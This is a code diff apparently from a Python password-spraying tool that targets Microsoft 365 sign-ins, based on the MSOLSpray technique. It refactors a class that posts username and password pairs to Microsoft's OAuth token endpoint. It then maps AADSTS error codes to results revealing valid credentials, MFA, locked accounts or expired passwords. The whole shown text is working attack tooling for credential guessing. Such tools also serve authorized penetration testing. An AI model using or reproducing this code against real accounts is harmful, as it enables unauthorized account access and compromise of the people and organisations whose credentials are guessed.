@@ -8,14 +8,27 @@ log = logging.getLogger("atomizer.modules.o365.sprayers.msol")
 
 class MSOLSpray(BaseSprayer):
     """
-    Original discovery and code by @dafthack
+    Original discovery of spraying technique and code by @dafthack
     https://github.com/dafthack/MSOLSpray
     """
 
-    def __init__(self, interval):
-        self.hosting_location = HostingLocation.O365
-        self.interval = interval
-        self.valid_accounts = set()
+    def __init__(self):
+        super().__init__()
+
+        # There are a lot more error types, if you want to add them all just fill out this dictionary :)
+        self.error_to_reason_map = {
+            "AADSTS50126": "Invalid Password",
+            "AADSTS50128": "Tenant for account doesn't exist. Check the domain to make sure they are using Azure/O365 services",
+            "AADSTS50059": "Tenant for account doesn't exist. Check the domain to make sure they are using Azure/O365 services",
+            "AADSTS50034": "The user doesn't exist",
+            "AADSTS50079": "Credential valid however the response indicates MFA (Microsoft) is in use",
+            "AADSTS50076": "Credential valid however the response indicates MFA (Microsoft) is in use",
+            "AADSTS50158": "Credential valid however the response indicates conditional access (MFA: DUO or other) is in use",
+            "AADSTS50053": "The account appears to be locked",
+            "AADSTS50057": "The account appears to be disabled",
+            "AADSTS50055": "Credential valid however the user's password is expired"
+        }
+
         self.headers = {
             "Accept": "application/json",
             "Content-Type": "application/x-www-form-urlencoded",
@@ -27,7 +40,14 @@ class MSOLSpray(BaseSprayer):
     async def shutdown(self):
         await self.client.aclose()
 
-    async def auth_o365(self, username: str, password: str) -> None:
+    async def auth_o365(self, username: str, password: str):
+        result = {
+            "error": "",
+            "valid": False,
+            "reason": "",
+            "status_code": None
+        }
+
         data = {
             "resource": "https://graph.windows.net",
             "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
@@ -41,41 +61,21 @@ class MSOLSpray(BaseSprayer):
         r = await self.client.post(
             "https://login.microsoft.com/common/oauth2/token", data=data
         )
+
+        result["status_code"] = r.status_code
         if r.status_code == 200:
-            log.debug(f"Found valid account {username} / {password}.")
-            self.valid_accounts.add(f"{username}:{password}")
-            return
+            result['valid'] = True
+            result['reason'] = "HTTP status code 200"
         else:
             msg = r.json()
             # log.debug(beutify_json(msg))
             # log.debug(f"Error: {error}")
             error = msg["error_description"].split("\r\n")[0]
 
-            if "AADSTS50126" in error:
-                log.debug("Invalid password.")
-            elif "AADSTS50128" in error or "AADSTS50059" in error:
-                log.debug(
-                    "Tenant for account doesn't exist. Check the domain to make sure they are using Azure/O365 services."
-                )
-            elif "AADSTS50034" in error:
-                log.debug("The user doesn't exist.")
-            elif "AADSTS50079" in error or "AADSTS50076" in error:
-                self.valid_accounts.add(f"{username}:{password}")
-                log.debug(
-                    "Credential valid however the response indicates MFA (Microsoft) is in use."
-                )
-            elif "AADSTS50158" in error:
-                self.valid_accounts.add(f"{username}:{password}")
-                log.debug(
-                    "Credential valid however the response indicates conditional access (MFA: DUO or other) is in use."
-                )
-            elif "AADSTS50053" in error:
-                self.valid_accounts.add(f"{username}:{password}")
-                log.debug("The account appears to be locked.")
-            elif "AADSTS50057" in error:
-                log.debug("The account appears to be disabled.")
-            elif "AADSTS50055" in error:
-                self.valid_accounts.add(f"{username}:{password}")
-                log.debug("Credential valid however the user's password is expired.")
-            else:
-                log.debug(f"Got unknown error: {error}")
+            for error_code,reason in self.error_to_reason_map.items():
+                if error_code in error:
+                    result["error"] = error_code
+                    result["reason"] = reason
+                    break
+
+        return result
